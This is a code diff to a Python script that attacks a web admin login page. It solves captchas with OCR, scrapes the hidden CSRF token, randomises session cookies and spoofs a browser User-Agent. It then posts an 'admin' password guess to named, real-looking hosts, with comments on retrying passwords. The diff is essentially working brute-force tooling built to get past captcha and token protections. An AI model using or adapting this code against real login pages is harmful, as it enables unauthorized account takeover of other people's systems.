@@ -1,6 +1,7 @@
 #
-import ddddocr, uuid, datetime, stat
+import ddddocr, uuid, datetime, stat, secrets
 import requests, json, re, os, time, random
+from bs4 import BeautifulSoup
 
 base_captcha = "captcha"
 
@@ -32,7 +33,7 @@ def cur_create_dir():  # 创建当前日期目录
 
 def create_uuid_png_name():
     get_timestamp_uuid = uuid.uuid1()  # 根据 时间戳生成 uuid , 保证全球唯一
-    return datetime.datetime.now().strftime('%Y-%m-%d_%H_%M_%S') + "_" + str(get_timestamp_uuid) + ".png"
+    return datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S') + "-" + str(get_timestamp_uuid) + ".png"
 
 
 def get_captcha_photo(url, captcha_uuid_name):  # 获取验证码图片
@@ -58,7 +59,7 @@ def proto_to_captcha1(url, img_path):  # 获取验证码图片并且识别转验
         print("走到这里")
 
 
-def get_captcha_code():  # 获取到正确密码
+def get_captcha_code():  # 获取到正确验证码
     # 创建目录
     dir_path = cur_create_dir()
     # 生成图片名称
@@ -69,18 +70,34 @@ def get_captcha_code():  # 获取到正确密码
     return captcha_code
 
 
-def login_attack(username, password, code):
-    data = "name={0}&password={1}&captcha={2}".format(code, username, password)
+def login_token():
+    response = requests.get(base_url + route_login)
+    # 使用 BeautifulSoup 解析 HTML 页面
+    soup = BeautifulSoup(response.content, 'html.parser')
+    # 获取 __token__ 的值
+    token = soup.find('input', {'name': '__token__'}).get('value')
+    print(token)
+    return token
+
+
+def login_attack(username, password, code, token):
+    # 请求参数
+    # data = {'name': username, 'password': password, 'captcha': code, '__token__': token}
+    data = "name={0}&password={1}&captcha={2}&__token__={3}".format(username, password, code, token)
     header = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
         'X-Requested-With': 'XMLHttpRequest',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Cookie': 'PHPSESSID=145123',
+        'Cookie': 'PHPSESSID=' + secrets.token_hex(13),
     }
-    res = requests.post(url=base_url + route_login, data=data, headers=header, verify=False)
+    print(data)
+    # res = requests.post(url=base_url + route_login, data=data, headers=header, verify=False)
+    res = requests.post(url=base_url + route_login, data=data, headers=header)
     result = json.loads(res.text)
     return result
 
 
+#  python http://www.ximimim.top:1008/admin/common/login.shtml 获取 这个页面中 <input type="hidden" name="__token__" value="xx"> 其中value的值 和 获取标签id等于captcha的img 图标内容 并且写入文件中
 def main():
     # url = "http://47.109.19.59:7070/admin/common/login.shtml"
     url = "http://47.109.19.59:7070"
@@ -88,5 +105,16 @@ def main():
 
 
 if __name__ == '__main__':
-    login_attack("xx", "xx", "xxx")
-    # main()
+    token = login_token()
+    captcha_code = get_captcha_code()
+    username = "admin"
+    password = "qq123456"
+    login_info = login_attack(username, password, captcha_code, token)
+    print(login_info)
+    if login_info['code'] == 1:
+        print("登录成功,用户名{0},密码{1}".format(username, password))
+    else:
+        pass
+        # print(login_info['msg'])
+        # if "验证码不正确" in print['msg']:
+        #     print("重试1次,本次密码{0},验证码{1}".format(password, captcha_code))
